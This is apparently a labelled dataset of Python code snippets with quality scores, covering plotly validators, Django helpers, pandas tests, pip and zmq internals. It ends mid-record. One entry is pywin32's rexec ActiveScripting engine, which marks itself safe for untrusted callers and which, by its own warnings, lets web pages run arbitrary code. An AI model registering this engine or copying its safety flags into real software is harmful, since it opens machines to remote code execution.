16	adjudicated	3	"# Copyright 2015 Google Inc. All rights reserved.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>""""""<<NEWL>>Sample App Engine application demonstrating how to use the Namespace Manager<<NEWL>>API with Memcache.<<NEWL>><<NEWL>>For more information, see README.md.<<NEWL>>""""""<<NEWL>><<NEWL>># [START all]<<NEWL>>from google.appengine.api import memcache<<NEWL>>from google.appengine.api import namespace_manager<<NEWL>>import webapp2<<NEWL>><<NEWL>><<NEWL>>class MemcacheCounterHandler(webapp2.RequestHandler):<<NEWL>>    """"""Increments counters in the global namespace as well as in whichever<<NEWL>>    namespace is specified by the request, which is arbitrarily named 'default'<<NEWL>>    if not specified.""""""<<NEWL>><<NEWL>>    def get(self, namespace='default'):<<NEWL>>        global_count = memcache.incr('counter', initial_value=0)<<NEWL>><<NEWL>>        # Save the current namespace.<<NEWL>>        previous_namespace = namespace_manager.get_namespace()<<NEWL>>        try:<<NEWL>>            namespace_manager.set_namespace(namespace)<<NEWL>>            namespace_count = memcache.incr('counter', initial_value=0)<<NEWL>>        finally:<<NEWL>>            # Restore the saved namespace.<<NEWL>>            namespace_manager.set_namespace(previous_namespace)<<NEWL>><<NEWL>>        self.response.write('Global: {}, Namespace {}: {}'.format(<<NEWL>>            global_count, namespace, namespace_count))<<NEWL>><<NEWL>><<NEWL>>app = webapp2.WSGIApplication([<<NEWL>>    (r'/memcache', MemcacheCounterHandler),<<NEWL>>    (r'/memcache/(.*)', MemcacheCounterHandler)<<NEWL>>], debug=True)<<NEWL>># [END all]"
296	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""hoverlabel"", parent_name=""scatterternary"", **kwargs<<NEWL>>    ):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
107	adjudicated	2	"import json<<NEWL>><<NEWL>>from django.core.serializers.json import DjangoJSONEncoder<<NEWL>>from django.http import HttpResponse<<NEWL>>try:<<NEWL>>    from django.utils.encoding import force_unicode as force_text  # Django < 1.5<<NEWL>>except ImportError as e:<<NEWL>>    from django.utils.encoding import force_text  # Django 1.5 / python3<<NEWL>>from django.utils.functional import Promise<<NEWL>>from django.utils.cache import add_never_cache_headers<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>><<NEWL>>import logging<<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>class LazyEncoder(DjangoJSONEncoder):<<NEWL>>    """"""Encodes django's lazy i18n strings<<NEWL>>    """"""<<NEWL>>    def default(self, obj):<<NEWL>>        if isinstance(obj, Promise):<<NEWL>>            return force_text(obj)<<NEWL>>        return super(LazyEncoder, self).default(obj)<<NEWL>><<NEWL>><<NEWL>>class JSONResponseMixin(object):<<NEWL>>    is_clean = False<<NEWL>><<NEWL>>    def render_to_response(self, context):<<NEWL>>        """""" Returns a JSON response containing 'context' as payload<<NEWL>>        """"""<<NEWL>>        return self.get_json_response(context)<<NEWL>><<NEWL>>    def get_json_response(self, content, **httpresponse_kwargs):<<NEWL>>        """""" Construct an `HttpResponse` object.<<NEWL>>        """"""<<NEWL>>        response = HttpResponse(content,<<NEWL>>                                content_type='application/json',<<NEWL>>                                **httpresponse_kwargs)<<NEWL>>        add_never_cache_headers(response)<<NEWL>>        return response<<NEWL>><<NEWL>>    def post(self, *args, **kwargs):<<NEWL>>        return self.get(*args, **kwargs)<<NEWL>><<NEWL>>    def get(self, request, *args, **kwargs):<<NEWL>>        self.request = request<<NEWL>>        response = None<<NEWL>><<NEWL>>        func_val = self.get_context_data(**kwargs)<<NEWL>>        if not self.is_clean:<<NEWL>>            assert isinstance(func_val, dict)<<NEWL>>            response = dict(func_val)<<NEWL>>            if 'error' not in response and 'sError' not in response:<<NEWL>>                response['result'] = 'ok'<<NEWL>>            else:<<NEWL>>                response['result'] = 'error'<<NEWL>>        else:<<NEWL>>            response = func_val<<NEWL>><<NEWL>>        dump = json.dumps(response, cls=LazyEncoder)<<NEWL>>        return self.render_to_response(dump)<<NEWL>><<NEWL>><<NEWL>>class JSONResponseView(JSONResponseMixin, TemplateView):<<NEWL>>    pass"
47	adjudicated	3	"import re<<NEWL>><<NEWL>># generated by scripts/generate_identifier_pattern.py<<NEWL>>pattern = re.compile(<<NEWL>>    r""[\w·̀-ͯ·҃-֑҇-ׇֽֿׁׂׅׄؐ-ًؚ-ٰٟۖ-ۜ۟-۪ۤۧۨ-ܑۭܰ-݊ަ-ް߫-߳ࠖ-࠙ࠛ-ࠣࠥ-ࠧࠩ-࡙࠭-࡛ࣔ-ࣣ࣡-ःऺ-़ा-ॏ॑-ॗॢॣঁ-ঃ়া-ৄেৈো-্ৗৢৣਁ-ਃ਼ਾ-ੂੇੈੋ-੍ੑੰੱੵઁ-ઃ઼ા-ૅે-ૉો-્ૢૣଁ-ଃ଼ା-ୄେୈୋ-୍ୖୗୢୣஂா-ூெ-ைொ-்ௗఀ-ఃా-ౄె-ైొ-్ౕౖౢౣಁ-ಃ಼ಾ-ೄೆ-ೈೊ-್ೕೖೢೣഁ-ഃാ-ൄെ-ൈൊ-്ൗൢൣංඃ්ා-ුූෘ-ෟෲෳัิ-ฺ็-๎ັິ-ູົຼ່-ໍ༹༘༙༵༷༾༿ཱ-྄྆྇ྍ-ྗྙ-ྼ࿆ါ-ှၖ-ၙၞ-ၠၢ-ၤၧ-ၭၱ-ၴႂ-ႍႏႚ-ႝ፝-፟ᜒ-᜔ᜲ-᜴ᝒᝓᝲᝳ឴-៓៝᠋-᠍ᢅᢆᢩᤠ-ᤫᤰ-᤻ᨗ-ᨛᩕ-ᩞ᩠-᩿᩼᪰-᪽ᬀ-ᬄ᬴-᭄᭫-᭳ᮀ-ᮂᮡ-ᮭ᯦-᯳ᰤ-᰷᳐-᳔᳒-᳨᳭ᳲ-᳴᳸᳹᷀-᷵᷻-᷿‿⁀⁔⃐-⃥⃜⃡-⃰℘℮⳯-⵿⳱ⷠ-〪ⷿ-゙゚〯꙯ꙴ-꙽ꚞꚟ꛰꛱ꠂ꠆ꠋꠣ-ꠧꢀꢁꢴ-ꣅ꣠-꣱ꤦ-꤭ꥇ-꥓ꦀ-ꦃ꦳-꧀ꧥꨩ-ꨶꩃꩌꩍꩻ-ꩽꪰꪲ-ꪴꪷꪸꪾ꪿꫁ꫫ-ꫯꫵ꫶ꯣ-ꯪ꯬꯭ﬞ︀-️︠-︯︳︴﹍-﹏＿𐇽𐋠𐍶-𐍺𐨁-𐨃𐨅𐨆𐨌-𐨏𐨸-𐨿𐨺𐫦𐫥𑀀-𑀂𑀸-𑁆𑁿-𑂂𑂰-𑂺𑄀-𑄂𑄧-𑅳𑄴𑆀-𑆂𑆳-𑇊𑇀-𑇌𑈬-𑈷𑈾𑋟-𑋪𑌀-𑌃𑌼𑌾-𑍄𑍇𑍈𑍋-𑍍𑍗𑍢𑍣𑍦-𑍬𑍰-𑍴𑐵-𑑆𑒰-𑓃𑖯-𑖵𑖸-𑗀𑗜𑗝𑘰-𑙀𑚫-𑚷𑜝-𑜫𑰯-𑰶𑰸-𑰿𑲒-𑲧𑲩-𑲶𖫰-𖫴𖬰-𖬶𖽑-𖽾𖾏-𖾒𛲝𛲞𝅥-𝅩𝅭-𝅲𝅻-𝆂𝆅-𝆋𝆪-𝆭𝉂-𝉄𝨀-𝨶𝨻-𝩬𝩵𝪄𝪛-𝪟𝪡-𝪯𞀀-𞀆𞀈-𞀘𞀛-𞀡𞀣𞀤𞀦-𞣐𞀪-𞣖𞥄-𞥊󠄀-󠇯]+""  # noqa: B950<<NEWL>>)"
265	adjudicated	0	"# Copyright 2019 Google, LLC.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># NOTE:<<NEWL>># These tests are unit tests that mock Pub/Sub.<<NEWL>>import base64<<NEWL>>import json<<NEWL>>import uuid<<NEWL>><<NEWL>>import mock<<NEWL>>import pytest<<NEWL>><<NEWL>>import main<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def client():<<NEWL>>    main.app.testing = True<<NEWL>>    return main.app.test_client()<<NEWL>><<NEWL>><<NEWL>>def test_empty_payload(client):<<NEWL>>    r = client.post(""/"", json="""")<<NEWL>>    assert r.status_code == 400<<NEWL>><<NEWL>><<NEWL>>def test_invalid_payload(client):<<NEWL>>    r = client.post(""/"", json={""nomessage"": ""invalid""})<<NEWL>>    assert r.status_code == 400<<NEWL>><<NEWL>><<NEWL>>def test_invalid_mimetype(client):<<NEWL>>    r = client.post(""/"", json=""{ message: true }"")<<NEWL>>    assert r.status_code == 400<<NEWL>><<NEWL>><<NEWL>>@mock.patch(""image.blur_offensive_images"", mock.MagicMock(return_value=204))<<NEWL>>def test_minimally_valid_message(client):<<NEWL>>    data_json = json.dumps({""name"": True, ""bucket"": True})<<NEWL>>    data = base64.b64encode(data_json.encode()).decode()<<NEWL>><<NEWL>>    r = client.post(""/"", json={""message"": {""data"": data}})<<NEWL>>    assert r.status_code == 204<<NEWL>><<NEWL>><<NEWL>>def test_call_to_blur_image(client, capsys):<<NEWL>>    filename = str(uuid.uuid4())<<NEWL>>    blur_bucket = ""blurred-bucket-"" + str(uuid.uuid4())<<NEWL>><<NEWL>>    data_json = json.dumps({""name"": filename, ""bucket"": blur_bucket})<<NEWL>>    data = base64.b64encode(data_json.encode()).decode()<<NEWL>><<NEWL>>    r = client.post(""/"", json={""message"": {""data"": data}})<<NEWL>>    assert r.status_code == 204<<NEWL>><<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert f""The image {filename} was detected as OK"" in out"
325	adjudicated	1	"import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>class TestDatetimeIndexFillNA:<<NEWL>>    @pytest.mark.parametrize(""tz"", [""US/Eastern"", ""Asia/Tokyo""])<<NEWL>>    def test_fillna_datetime64(self, tz):<<NEWL>>        # GH 11343<<NEWL>>        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""])<<NEWL>><<NEWL>>        exp = pd.DatetimeIndex(<<NEWL>>            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""]<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)<<NEWL>><<NEWL>>        # tz mismatch<<NEWL>>        exp = pd.Index(<<NEWL>>            [<<NEWL>>                pd.Timestamp(""2011-01-01 09:00""),<<NEWL>>                pd.Timestamp(""2011-01-01 10:00"", tz=tz),<<NEWL>>                pd.Timestamp(""2011-01-01 11:00""),<<NEWL>>            ],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)<<NEWL>><<NEWL>>        # object<<NEWL>>        exp = pd.Index(<<NEWL>>            [pd.Timestamp(""2011-01-01 09:00""), ""x"", pd.Timestamp(""2011-01-01 11:00"")],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(""x""), exp)<<NEWL>><<NEWL>>        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""], tz=tz)<<NEWL>><<NEWL>>        exp = pd.DatetimeIndex(<<NEWL>>            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""], tz=tz<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)<<NEWL>><<NEWL>>        exp = pd.Index(<<NEWL>>            [<<NEWL>>                pd.Timestamp(""2011-01-01 09:00"", tz=tz),<<NEWL>>                pd.Timestamp(""2011-01-01 10:00""),<<NEWL>>                pd.Timestamp(""2011-01-01 11:00"", tz=tz),<<NEWL>>            ],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)<<NEWL>><<NEWL>>        # object<<NEWL>>        exp = pd.Index(<<NEWL>>            [<<NEWL>>                pd.Timestamp(""2011-01-01 09:00"", tz=tz),<<NEWL>>                ""x"",<<NEWL>>                pd.Timestamp(""2011-01-01 11:00"", tz=tz),<<NEWL>>            ],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(""x""), exp)"
234	adjudicated	0	"import string<<NEWL>><<NEWL>>from django.core.exceptions import ImproperlyConfigured<<NEWL>>from django.template import Origin, TemplateDoesNotExist<<NEWL>>from django.utils.html import conditional_escape<<NEWL>><<NEWL>>from .base import BaseEngine<<NEWL>>from .utils import csrf_input_lazy, csrf_token_lazy<<NEWL>><<NEWL>><<NEWL>>class TemplateStrings(BaseEngine):<<NEWL>>    app_dirname = ""template_strings""<<NEWL>><<NEWL>>    def __init__(self, params):<<NEWL>>        params = params.copy()<<NEWL>>        options = params.pop(""OPTIONS"").copy()<<NEWL>>        if options:<<NEWL>>            raise ImproperlyConfigured(""Unknown options: {}"".format("", "".join(options)))<<NEWL>>        super().__init__(params)<<NEWL>><<NEWL>>    def from_string(self, template_code):<<NEWL>>        return Template(template_code)<<NEWL>><<NEWL>>    def get_template(self, template_name):<<NEWL>>        tried = []<<NEWL>>        for template_file in self.iter_template_filenames(template_name):<<NEWL>>            try:<<NEWL>>                with open(template_file, encoding=""utf-8"") as fp:<<NEWL>>                    template_code = fp.read()<<NEWL>>            except FileNotFoundError:<<NEWL>>                tried.append(<<NEWL>>                    (<<NEWL>>                        Origin(template_file, template_name, self),<<NEWL>>                        ""Source does not exist"",<<NEWL>>                    )<<NEWL>>                )<<NEWL>>            else:<<NEWL>>                return Template(template_code)<<NEWL>>        raise TemplateDoesNotExist(template_name, tried=tried, backend=self)<<NEWL>><<NEWL>><<NEWL>>class Template(string.Template):<<NEWL>>    def render(self, context=None, request=None):<<NEWL>>        if context is None:<<NEWL>>            context = {}<<NEWL>>        else:<<NEWL>>            context = {k: conditional_escape(v) for k, v in context.items()}<<NEWL>>        if request is not None:<<NEWL>>            context[""csrf_input""] = csrf_input_lazy(request)<<NEWL>>            context[""csrf_token""] = csrf_token_lazy(request)<<NEWL>>        return self.safe_substitute(context)"
374	adjudicated	2	"# A version of the ActiveScripting engine that enables rexec support<<NEWL>># This version supports hosting by IE - however, due to Python's<<NEWL>># rexec module being neither completely trusted nor private, it is<<NEWL>># *not* enabled by default.<<NEWL>># As of Python 2.2, rexec is simply not available - thus, if you use this,<<NEWL>># a HTML page can do almost *anything* at all on your machine.<<NEWL>><<NEWL>># You almost certainly do NOT want to use thus!<<NEWL>><<NEWL>>import pythoncom<<NEWL>>from win32com.axscript import axscript<<NEWL>>import winerror<<NEWL>>from . import pyscript<<NEWL>><<NEWL>>INTERFACE_USES_DISPEX = 0x00000004  # Object knows to use IDispatchEx<<NEWL>>INTERFACE_USES_SECURITY_MANAGER = (<<NEWL>>    0x00000008  # Object knows to use IInternetHostSecurityManager<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class PyScriptRExec(pyscript.PyScript):<<NEWL>>    # Setup the auto-registration stuff...<<NEWL>>    _reg_verprogid_ = ""Python.AXScript-rexec.2""<<NEWL>>    _reg_progid_ = ""Python""  # Same ProgID as the standard engine.<<NEWL>>    # <<TAB>>_reg_policy_spec_ = default<<NEWL>>    _reg_catids_ = [axscript.CATID_ActiveScript, axscript.CATID_ActiveScriptParse]<<NEWL>>    _reg_desc_ = ""Python ActiveX Scripting Engine (with rexec support)""<<NEWL>>    _reg_clsid_ = ""{69c2454b-efa2-455b-988c-c3651c4a2f69}""<<NEWL>>    _reg_class_spec_ = ""win32com.axscript.client.pyscript_rexec.PyScriptRExec""<<NEWL>>    _reg_remove_keys_ = [("".pys"",), (""pysFile"",)]<<NEWL>>    _reg_threading_ = ""Apartment""<<NEWL>><<NEWL>>    def _GetSupportedInterfaceSafetyOptions(self):<<NEWL>>        # print ""**** calling"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions, ""**->"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions(self)<<NEWL>>        return (<<NEWL>>            INTERFACE_USES_DISPEX<<NEWL>>            | INTERFACE_USES_SECURITY_MANAGER<<NEWL>>            | axscript.INTERFACESAFE_FOR_UNTRUSTED_DATA<<NEWL>>            | axscript.INTERFACESAFE_FOR_UNTRUSTED_CALLER<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    print(""WARNING: By registering this engine, you are giving remote HTML code"")<<NEWL>>    print(""the ability to execute *any* code on your system."")<<NEWL>>    print()<<NEWL>>    print(""You almost certainly do NOT want to do this."")<<NEWL>>    print(""You have been warned, and are doing this at your own (significant) risk"")<<NEWL>>    pyscript.Register(PyScriptRExec)"
73	adjudicated	3	"""""""HTTP cache implementation.<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>from contextlib import contextmanager<<NEWL>>from typing import Iterator, Optional<<NEWL>><<NEWL>>from pip._vendor.cachecontrol.cache import BaseCache<<NEWL>>from pip._vendor.cachecontrol.caches import FileCache<<NEWL>>from pip._vendor.requests.models import Response<<NEWL>><<NEWL>>from pip._internal.utils.filesystem import adjacent_tmp_file, replace<<NEWL>>from pip._internal.utils.misc import ensure_dir<<NEWL>><<NEWL>><<NEWL>>def is_from_cache(response: Response) -> bool:<<NEWL>>    return getattr(response, ""from_cache"", False)<<NEWL>><<NEWL>><<NEWL>>@contextmanager<<NEWL>>def suppressed_cache_errors() -> Iterator[None]:<<NEWL>>    """"""If we can't access the cache then we can just skip caching and process<<NEWL>>    requests as if caching wasn't enabled.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        yield<<NEWL>>    except OSError:<<NEWL>>        pass<<NEWL>><<NEWL>><<NEWL>>class SafeFileCache(BaseCache):<<NEWL>>    """"""<<NEWL>>    A file based cache which is safe to use even when the target directory may<<NEWL>>    not be accessible or writable.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, directory: str) -> None:<<NEWL>>        assert directory is not None, ""Cache directory must not be None.""<<NEWL>>        super().__init__()<<NEWL>>        self.directory = directory<<NEWL>><<NEWL>>    def _get_cache_path(self, name: str) -> str:<<NEWL>>        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our<<NEWL>>        # class for backwards-compatibility and to avoid using a non-public<<NEWL>>        # method.<<NEWL>>        hashed = FileCache.encode(name)<<NEWL>>        parts = list(hashed[:5]) + [hashed]<<NEWL>>        return os.path.join(self.directory, *parts)<<NEWL>><<NEWL>>    def get(self, key: str) -> Optional[bytes]:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            with open(path, ""rb"") as f:<<NEWL>>                return f.read()<<NEWL>><<NEWL>>    def set(self, key: str, value: bytes) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            ensure_dir(os.path.dirname(path))<<NEWL>><<NEWL>>            with adjacent_tmp_file(path) as f:<<NEWL>>                f.write(value)<<NEWL>><<NEWL>>            replace(f.name, path)<<NEWL>><<NEWL>>    def delete(self, key: str) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            os.remove(path)"
133	adjudicated	1	"""""""zmq Context class""""""<<NEWL>><<NEWL>># Copyright (C) PyZMQ Developers<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>from zmq.constants import EINVAL, IO_THREADS<<NEWL>>from zmq.error import InterruptedSystemCall, ZMQError, _check_rc<<NEWL>><<NEWL>>from ._cffi import ffi<<NEWL>>from ._cffi import lib as C<<NEWL>><<NEWL>><<NEWL>>class Context:<<NEWL>>    _zmq_ctx = None<<NEWL>>    _iothreads = None<<NEWL>>    _closed = True<<NEWL>>    _shadow = False<<NEWL>><<NEWL>>    def __init__(self, io_threads=1, shadow=None):<<NEWL>><<NEWL>>        if shadow:<<NEWL>>            self._zmq_ctx = ffi.cast(""void *"", shadow)<<NEWL>>            self._shadow = True<<NEWL>>        else:<<NEWL>>            self._shadow = False<<NEWL>>            if not io_threads >= 0:<<NEWL>>                raise ZMQError(EINVAL)<<NEWL>><<NEWL>>            self._zmq_ctx = C.zmq_ctx_new()<<NEWL>>        if self._zmq_ctx == ffi.NULL:<<NEWL>>            raise ZMQError(C.zmq_errno())<<NEWL>>        if not shadow:<<NEWL>>            C.zmq_ctx_set(self._zmq_ctx, IO_THREADS, io_threads)<<NEWL>>        self._closed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def underlying(self):<<NEWL>>        """"""The address of the underlying libzmq context""""""<<NEWL>>        return int(ffi.cast('size_t', self._zmq_ctx))<<NEWL>><<NEWL>>    @property<<NEWL>>    def closed(self):<<NEWL>>        return self._closed<<NEWL>><<NEWL>>    def set(self, option, value):<<NEWL>>        """"""set a context option<<NEWL>><<NEWL>>        see zmq_ctx_set<<NEWL>>        """"""<<NEWL>>        rc = C.zmq_ctx_set(self._zmq_ctx, option, value)<<NEWL>>        _check_rc(rc)<<NEWL>><<NEWL>>    def get(self, option):<<NEWL>>        """"""get context option<<NEWL>><<NEWL>>        see zmq_ctx_get<<NEWL>>        """"""<<NEWL>>        rc = C.zmq_ctx_get(self._zmq_ctx, option)<<NEWL>>        _check_rc(rc, error_without_errno=False)<<NEWL>>        return rc<<NEWL>><<NEWL>>    def term(self):<<NEWL>>        if self.closed:<<NEWL>>            return<<NEWL>><<NEWL>>        rc = C.zmq_ctx_destroy(self._zmq_ctx)<<NEWL>>        try:<<NEWL>>            _check_rc(rc)<<NEWL>>        except InterruptedSystemCall:<<NEWL>>            # ignore interrupted term<<NEWL>>            # see PEP 475 notes about close & EINTR for why<<NEWL>>            pass<<NEWL>><<NEWL>>        self._zmq_ctx = None<<NEWL>>        self._closed = True<<NEWL>><<NEWL>><<NEWL>>__all__ = ['Context']"
22	adjudicated	0	"# Copyright (c) Meta Platforms, Inc. and affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>># pyre-unsafe<<NEWL>><<NEWL>>from typing import Any, Iterable, Mapping, Sequence<<NEWL>><<NEWL>>from viktor._vendor.libcst._parser.base_parser import BaseParser<<NEWL>>from viktor._vendor.libcst._parser.grammar import get_nonterminal_conversions, get_terminal_conversions<<NEWL>>from viktor._vendor.libcst._parser.parso.pgen2.generator import Grammar<<NEWL>>from viktor._vendor.libcst._parser.parso.python.token import TokenType<<NEWL>>from viktor._vendor.libcst._parser.types.config import ParserConfig<<NEWL>>from viktor._vendor.libcst._parser.types.conversions import NonterminalConversion, TerminalConversion<<NEWL>>from viktor._vendor.libcst._parser.types.token import Token<<NEWL>><<NEWL>><<NEWL>>class PythonCSTParser(BaseParser[Token, TokenType, Any]):<<NEWL>>    config: ParserConfig<<NEWL>>    terminal_conversions: Mapping[str, TerminalConversion]<<NEWL>>    nonterminal_conversions: Mapping[str, NonterminalConversion]<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        *,<<NEWL>>        tokens: Iterable[Token],<<NEWL>>        config: ParserConfig,<<NEWL>>        pgen_grammar: ""Grammar[TokenType]"",<<NEWL>>        start_nonterminal: str = ""file_input"",<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(<<NEWL>>            tokens=tokens,<<NEWL>>            lines=config.lines,<<NEWL>>            pgen_grammar=pgen_grammar,<<NEWL>>            start_nonterminal=start_nonterminal,<<NEWL>>        )<<NEWL>>        self.config = config<<NEWL>>        self.terminal_conversions = get_terminal_conversions()<<NEWL>>        self.nonterminal_conversions = get_nonterminal_conversions(<<NEWL>>            config.version, config.future_imports<<NEWL>>        )<<NEWL>><<NEWL>>    def convert_nonterminal(self, nonterminal: str, children: Sequence[Any]) -> Any:<<NEWL>>        return self.nonterminal_conversions[nonterminal](self.config, children)<<NEWL>><<NEWL>>    def convert_terminal(self, token: Token) -> Any:<<NEWL>>        return self.terminal_conversions[token.type.name](self.config, token)"
162	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""choroplethmapbox.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
340	adjudicated	2	# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the 'License');<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an 'AS IS' BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START functions_pubsub_integration_test]<<NEWL>>import base64<<NEWL>>import os<<NEWL>>import subprocess<<NEWL>>import uuid<<NEWL>><<NEWL>>import requests<<NEWL>>from requests.packages.urllib3.util.retry import Retry<<NEWL>><<NEWL>><<NEWL>>def 